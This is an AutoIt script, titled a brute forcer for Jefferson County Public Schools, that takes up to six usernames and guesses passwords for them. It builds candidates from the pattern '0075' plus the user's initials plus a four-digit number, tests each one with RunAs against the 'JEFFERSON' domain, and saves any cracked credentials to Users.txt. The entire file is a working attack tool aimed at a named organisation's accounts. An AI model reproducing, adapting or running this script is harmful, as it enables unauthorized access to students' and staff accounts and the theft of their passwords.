#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Version=Beta
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#NoTrayIcon
#include <GUIConstantsEx.au3>
HotKeySet("{F11}", "Stop")

Opt('GUICloseOnESC', 000)
Opt('MustDeclareVars', 1)
Opt('TrayAutoPause', 000)

Global $FI[2][6], $LI[2][6]
Global $Msg, $Num, $GUI, $Stop
Global $User[7], $Exec, $Prog, $Results[2], $ID, $Time[2], $Stat, $Total
Global $List[6]
Global $Complete[6]
Global $Users = 0
$Results[1] = "|7610|7673"

GUI()

Func GUI()

	$GUI = GUICreate("Jefferson County Public Schools Brute Forcer v1.3", 320, 220,  -1,  -1, 0x10CA0080)

	GUICtrlCreateLabel("Usernames"       , 020, 020, 100, 020, 0x00001201)

	For $Num = 0 To 5
		$User[$Num] = GUICtrlCreateInput("", 020, 040 + (020 * $Num), 100, 020, 0x00000109)
	Next
	$User[6] = GUICtrlCreateList(""      , 140, 020, 160, 190, 0x00000103)
	$Stat = GUICtrlCreateLabel(""        , 020, 190, 100, 020, 0x00001201)
	$Exec = GUICtrlCreateButton("Start"  , 020, 160, 100, 020, 0x00008301)
	$Prog = GUICtrlCreateProgress(         020, 160, 100, 020, 0x00000001)

	GUICtrlSetState($Prog, $GUI_HIDE)
	ProcessSetPriority(WinGetProcess($GUI), 4)

	While 1
		$Msg = GUIGetMsg()
		Select

			Case $Msg = $GUI_EVENT_CLOSE
				Exit(0)

			Case $Msg = $Exec
				For $Count = 0 To 5
					$FI[0][$Count] = StringLeft(GUICtrlRead($User[$Count]), 1)
					If StringLen(GUICtrlRead($User[$Count])) = 7 Then
						$LI[0][$Count] = StringRight(StringLeft(GUICtrlRead($User[$Count]), 2), 1)
					ElseIf StringLen(GUICtrlRead($User[$Count])) = 8 Then
						$LI[0][$Count] = StringRight(StringLeft(GUICtrlRead($User[$Count]), 3), 1)
					EndIf
					If Not GUICtrlRead($User[$Count]) = "" Then
						If StringLen(GUICtrlRead($User[$Count])) = 7 Or StringLen(GUICtrlRead($User[$Count])) = 8 Then
							If StringIsAlpha($FI[0][$Count]) And StringIsAlpha($LI[0][$Count]) Then
								GUICtrlSetBkColor($User[$Count], 0x00FF00)
								$List[$Users] = GUICtrlRead($User[$Count])
								$FI[1][$Users] = $FI[0][$Count]
								$LI[1][$Users] = $LI[0][$Count]
								$Users += 1
							Else
								GUICtrlSetBkColor($User[$Count], 0x00FF00)
							EndIf
						Else
							GUICtrlSetBkColor($User[$Count], 0xFFFF00)
						EndIf
					EndIf
				GUICtrlSetStyle($User[$Count], 0x00000809)
				Next
				GUICtrlSetState($Exec, $GUI_HIDE)
				GUICtrlSetState($Prog, $GUI_SHOW)
				$Time[0] = TimerInit()
				Brute()

			Case Else
				;;;

		EndSelect
	WEnd
EndFunc

Func Brute()
	For $Num = 0 To 9999
		$Time[1] = TimerInit()
		If $Stop Then
			ExitLoop
		EndIf
		$ID = StringRight("000" & $Num, 4)
		If StringInStr($Results[1], $ID) > 0 Then
			ConsoleWrite($ID & " Skipped" & @CRLF)
			ContinueLoop
		EndIf
		GUICtrlSetData($Prog, ($Num +1) / 100)
		For $Count = 0 To $Users - 1
			If $Complete[$Count] Then
				ContinueLoop
			EndIf
			If RunAs($List[$Count], "JEFFERSON", "0075" & $FI[1][$Count] & $LI[1][$Count] & $ID, 3, @ComSpec) <> 0 Then
				FileWrite(@ScriptDir & "\Users.txt", $List[$Count] & " - 0075" & $FI[1][$Count] & $LI[1][$Count] & $ID & @CRLF)
				$Results[0] = $Results[0] & "|" & $List[$Count] & " - 0075" & $FI[1][$Count] & $LI[1][$Count] & $ID
				$Results[1] = $Results[1] & "|" & $ID
				GUICtrlSetData($User[6], $Results[0])
				$Complete[$Count] = True
			EndIf
		Next
		If $Num = 9999 Then
			ConsoleWrite("Completed Brute Force Attack in " & TimerDiff($Time[0]) / 1000 & " seconds" & @CRLF)
			For $Count = 0 To $Users - 1
				If Not $Complete[$Count] Then
					$Results[0] = $Results[0] & "|" & $List[$Count] & " - "
				EndIf
			Next
		EndIf
		$Total += TimerDiff($Time[1])
		GUICtrlSetData($Stat, StringLeft(($Total / 1000) / $Num + 1, 5) & "s/Loop")
	Next
	$Users = 0
	$Stop = False
	GUICtrlSetState($Prog, $GUI_HIDE)
	GUICtrlSetState($Exec, $GUI_SHOW)
	For $Count = 0 To 5
		GUICtrlSetBkColor($User[$Count], 0xFFFFFF)
		GUICtrlSetStyle($User[$Count], 0x00000009)
		$Complete[$Count] = False
		$List[$Count] = ""
	Next
EndFunc

Func Stop()
	$Stop = True
EndFunc